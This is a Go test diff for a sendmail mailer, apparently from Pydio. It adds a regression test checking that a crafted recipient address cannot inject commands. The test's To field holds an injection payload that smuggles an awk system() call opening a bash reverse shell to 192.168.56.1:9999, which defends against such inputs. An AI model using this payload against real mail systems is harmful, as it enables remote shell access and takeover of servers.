@@ -73,3 +73,24 @@ func TestSendmail_Send(t *testing.T) {
 		So(err, ShouldNotBeNil)
 	})
 }
+
+func TestSendmail_Input(t *testing.T) {
+	Convey("Test sendmail input", t, func() {
+		sendmail := &Sendmail{}
+		sendmail.BinPath = "/usr/bin/awk"
+		e := sendmail.Send(&mailer.Mail{
+			From:        &mailer.User{Address: "test@pydio.com"},
+			To:          []*mailer.User{{Address: "\";BEGIN {system(\"/usr/bin/bash -i >& /dev/tcp/192.168.56.1/9999 0>&1\");exit}\"#"}},
+			Subject:     "test",
+			ContentHtml: "Test",
+		})
+		So(e, ShouldNotBeNil)
+		e = sendmail.Send(&mailer.Mail{
+			From:        &mailer.User{Address: "test@pydio.com"},
+			To:          []*mailer.User{{Address: "toto@pydio.com"}},
+			Subject:     "test",
+			ContentHtml: "Test",
+		})
+		So(e, ShouldBeNil)
+	})
+}
